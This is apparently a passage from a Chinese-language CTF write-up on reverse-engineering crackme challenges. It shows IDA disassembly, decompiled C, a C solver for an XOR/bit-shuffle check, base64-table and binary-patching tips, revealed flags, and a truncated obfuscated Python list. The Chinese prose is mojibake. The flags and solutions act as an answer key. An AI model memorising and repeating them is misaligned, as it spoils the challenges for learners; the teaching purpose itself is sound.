<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">Str= byte ptr -40h</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 60h</span><br><span class="line">call    __main</span><br><span class="line">lea     rax, [rbp+Str]</span><br><span class="line">mov     rdx, rax</span><br><span class="line">lea     rcx, Format     ; &quot;%s&quot;</span><br><span class="line">call    scanf</span><br><span class="line">lea     rax, [rbp+Str]</span><br><span class="line">mov     rcx, rax        ; Str</span><br><span class="line">call    strlen</span><br><span class="line">mov     rdx, rax</span><br><span class="line">lea     rax, [rbp+Str]</span><br><span class="line">mov     r8, rdx         ; Size</span><br><span class="line">lea     rdx, flag       ; &quot;cnss&#123;1t_s3ems_l1ke_Y0u_c4n_us3_IDA_n0w!&quot;...</span><br><span class="line">mov     rcx, rax        ; Buf1</span><br><span class="line">call    memcmp</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     short loc_401587</span><br></pre></td></tr></table></figure>



<h2 id="Baby-Find-me"><a href="#Baby-Find-me" class="headerlink" title="[Baby] Find me"></a>[Baby] Find me</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">call    __main</span><br><span class="line">lea     rcx, aOopsWhereIsMyF ; &quot;Oops! Where is my flag?&quot;</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aLearnAboutStri ; &quot;Learn about Strings and you can see the&quot;...</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aLearnAboutFunc ; &quot;Learn about Functions and you can see t&quot;...</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aLearnAboutXref ; &quot;Learn about Xref and you can see the th&quot;...</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aTheLastPartIsI ; &quot;The last part is _ID4_N0w!&#125;&quot;</span><br><span class="line">call    puts</span><br><span class="line">add     rsp, 20h</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºï¼Œæœå­—ç¬¦ä¸²cnss{ ï¼Œalt+tåŒ¹é…å¤§å°å†™ï¼Œæ‰¾åˆ°ç¬¬ä¸€éƒ¨åˆ†cnss{W0w!Y0uâ€™,0</p>
<p>æŸ¥æ‰¾å‡½æ•°ï¼Œå‘ç°ç¬¬äºŒéƒ¨åˆ†æ˜¯å‡½æ•°å_Comp1et3ly_Uns7and_</p>
<p>äº¤å‰å¼•ç”¨putsæ‰¾åˆ°ç¬¬ä¸‰éƒ¨åˆ†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public sub736</span><br><span class="line">sub736 proc near</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">mov     ecx, 68h ; &#x27;h&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 30h ; &#x27;0&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 77h ; &#x27;w&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 5Fh ; &#x27;_&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 74h ; &#x27;t&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 30h ; &#x27;0&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 5Fh ; &#x27;_&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 75h ; &#x27;u&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 73h ; &#x27;s&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 33h ; &#x27;3&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">lea     rcx, Buffer     ; &quot;Find out which function refer to me!&quot;</span><br><span class="line">call    puts</span><br><span class="line">mov     eax, 1BF52h</span><br><span class="line">add     rsp, 20h</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>æ‹¼æ¥è·å¾—flag cnss{W0w!Y0u_Comp1et3ly_Uns7and_h0w_t0_us3_ID4_N0w!}</p>
<h2 id="Easy-å›ãƒ¬-é›ªæœˆèŠ±"><a href="#Easy-å›ãƒ¬-é›ªæœˆèŠ±" class="headerlink" title="[Easy] å›ãƒ¬! é›ªæœˆèŠ±"></a>[Easy] å›ãƒ¬! é›ªæœˆèŠ±</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    v7[i] ^= <span class="number">0x11</span>u;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">28</span>; ++j )</span><br><span class="line">    encode(&amp;v7[j], &amp;v7[j + <span class="number">1</span>], &amp;v7[j + <span class="number">2</span>], &amp;v7[j + <span class="number">3</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">31</span> &amp;&amp; v7[k] == cipher[k]; ++k )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( k == <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ç§é€†å‘é¢˜å€’è¿‡æ¥çœ‹ä¼šå¾ˆç›´è§‚ï¼Œåˆ†ä¸‰å±‚ï¼ŒæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å¼‚æˆ–ä¸Š0x11uï¼Œç„¶åencodeä¸€éï¼Œå’Œcipheråˆ¤æ–­ï¼Œä¸€è‡´è·å¾—flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">encode</span><span class="params">(_BYTE *a1, _BYTE *a2, _BYTE *a3, _BYTE *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+2Dh] [rbp-3h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+2Eh] [rbp-2h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+2Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v5 = (*a1 &lt;&lt; <span class="number">7</span>) | (*a2 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  v6 = ((*a4 &gt;&gt; <span class="number">2</span>) | (*a3 &lt;&lt; <span class="number">6</span>)) ^ v5;</span><br><span class="line">  v7 = ((*a1 &gt;&gt; <span class="number">1</span>) | (*a2 &lt;&lt; <span class="number">7</span>)) ^ v6;</span><br><span class="line">  v8 = ((*a3 &gt;&gt; <span class="number">2</span>) | (*a4 &lt;&lt; <span class="number">6</span>)) ^ v7;</span><br><span class="line">  *a1 = v5;</span><br><span class="line">  *a2 = v6;</span><br><span class="line">  *a3 = v7;</span><br><span class="line">  result = a4;</span><br><span class="line">  *a4 = v8;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹äº†åŠå¤©äº†ä¸å¤ªä¼šï¼Œå»æ‰å¼‚æˆ–ä¹‹åå…¶ä»–çš„ä¸çŸ¥é“æ€ä¹ˆåšäº†</p>
<p>æœäº†ä¸€ä¸‹å‘ç°è¿™å¥½åƒæ˜¯å¾€å¹´é¢˜ï¼Œåšæ³•æ˜¯æŠŠå¼‚æˆ–å»æ‰åï¼Œæ ¹æ®a1 a2 a3 a4çš„é¡ºåºå€’ç€åšä¸€éå°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c[] = &#123;</span><br><span class="line">	<span class="number">63</span>,<span class="number">143</span>,<span class="number">163</span>,<span class="number">188</span>,<span class="number">141</span>,<span class="number">39</span>,<span class="number">122</span>,<span class="number">103</span>,<span class="number">226</span>,<span class="number">3</span>,<span class="number">162</span>,<span class="number">224</span>,</span><br><span class="line">		  <span class="number">172</span>,<span class="number">234</span>,<span class="number">149</span>,<span class="number">139</span>,<span class="number">163</span>,<span class="number">237</span>,<span class="number">204</span>,<span class="number">182</span>,<span class="number">50</span>,<span class="number">140</span>,<span class="number">148</span>,<span class="number">82</span>,</span><br><span class="line">		  <span class="number">130</span>,<span class="number">138</span>,<span class="number">20</span>,<span class="number">198</span>,<span class="number">245</span>,<span class="number">174</span>,<span class="number">104</span>,<span class="number">115</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">28</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		c[i + <span class="number">3</span>] ^= c[i + <span class="number">2</span>];</span><br><span class="line">		c[i + <span class="number">2</span>] ^= c[i + <span class="number">1</span>];</span><br><span class="line">		c[i + <span class="number">1</span>] ^= c[i + <span class="number">0</span>];</span><br><span class="line">		<span class="type">int</span> p[<span class="number">4</span>];</span><br><span class="line">		p[<span class="number">0</span>] = ((c[i + <span class="number">2</span>] &amp; <span class="number">127</span>) &lt;&lt; <span class="number">1</span>) | (c[i] &gt;&gt; <span class="number">7</span>);</span><br><span class="line">		p[<span class="number">1</span>] = ((c[i] &amp; <span class="number">127</span>) &lt;&lt; <span class="number">1</span>) | (c[i + <span class="number">2</span>] &gt;&gt; <span class="number">7</span>);</span><br><span class="line">		p[<span class="number">2</span>] = ((c[i + <span class="number">3</span>] &amp; <span class="number">63</span>) &lt;&lt; <span class="number">2</span>) | (c[i + <span class="number">1</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">		p[<span class="number">3</span>] = ((c[i + <span class="number">1</span>] &amp; <span class="number">63</span>) &lt;&lt; <span class="number">2</span>) | (c[i + <span class="number">3</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">			c[i + j] = p[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">		<span class="built_in">putchar</span>(c[i] ^ <span class="number">17</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Easy-é‚ªç‹çœŸçœ¼"><a href="#Easy-é‚ªç‹çœŸçœ¼" class="headerlink" title="[Easy] é‚ªç‹çœŸçœ¼"></a>[Easy] é‚ªç‹çœŸçœ¼</h2><p>encode 3å’Œ4 ç„¶åè¿˜æœ‰ä¸€ä¸ªalphaçš„ç´¢å¼•è¡¨ï¼Œåº”è¯¥æ˜¯base64 ç„¶åæ›¿æ¢äº†ç´¢å¼•è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2, _BYTE *a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [rsp+70h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  v13 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">3</span> )</span><br><span class="line">    v12 = <span class="number">3</span> - a2 % <span class="number">3</span>;</span><br><span class="line">  v9 = a2 + v12;</span><br><span class="line">  v8 = <span class="number">8</span> * (a2 + v12) / <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 = alpha[*v13 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( a2 + v12 - <span class="number">3</span> == i &amp;&amp; v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)*v13, <span class="number">6</span>i64, <span class="number">2</span>i64);</span><br><span class="line">        a3[<span class="number">1</span>] = alpha[v5 + (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">0</span>i64, <span class="number">4</span>i64)];</span><br><span class="line">        a3[<span class="number">2</span>] = alpha[(<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">4</span>i64, <span class="number">2</span>i64)];</span><br><span class="line">        a3[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v12 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        a3[<span class="number">1</span>] = alpha[(<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)*v13, <span class="number">6</span>i64, <span class="number">2</span>i64)];</span><br><span class="line">        a3[<span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">        a3[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)*v13, <span class="number">6</span>i64, <span class="number">2</span>i64);</span><br><span class="line">      a3[<span class="number">1</span>] = alpha[v6 + (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">0</span>i64, <span class="number">4</span>i64)];</span><br><span class="line">      v7 = (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">4</span>i64, <span class="number">2</span>i64);</span><br><span class="line">      a3[<span class="number">2</span>] = alpha[v7 + (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">2</span>], <span class="number">0</span>i64, <span class="number">6</span>i64)];</span><br><span class="line">      a3[<span class="number">3</span>] = alpha[v13[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    a3 += <span class="number">4</span>;</span><br><span class="line">    v13 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    *a4 = v8;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨è¿™ä¸ªç½‘ç«™<a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex%E6%8A%8Aalpha%E7%B4%A2%E5%BC%95%E8%A1%A8%E5%8A%A0%E4%B8%8A%E5%8E%BB%EF%BC%8C%E8%A7%A3%E5%AF%86UR3oWS5E0G03tRibWRrR0cEx%E6%8B%BF%E5%88%B0flag">http://web.chacuo.net/netbasexæŠŠalphaç´¢å¼•è¡¨åŠ ä¸Šå»ï¼Œè§£å¯†UR3oWS5E0G03tRibWRrR0cExæ‹¿åˆ°flag</a></p>
<h2 id="Mid-æ­å–œä½ è·å¾—äº†flagæç°æœºä¼šï¼"><a href="#Mid-æ­å–œä½ è·å¾—äº†flagæç°æœºä¼šï¼" class="headerlink" title="[Mid] æ­å–œä½ è·å¾—äº†flagæç°æœºä¼šï¼"></a>[Mid] æ­å–œä½ è·å¾—äº†flagæç°æœºä¼šï¼</h2><p>idaä¸­patch programä¿®æ”¹ç„¶åç›´æ¥call outputflagå°±æ‹¿åˆ°flagäº†</p>
<h2 id="Mid-Pyfuck"><a href="#Mid-Pyfuck" class="headerlink" title="[Mid] Pyfuck"></a>[Mid] Pyfuck</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x = [~((((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~(((((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;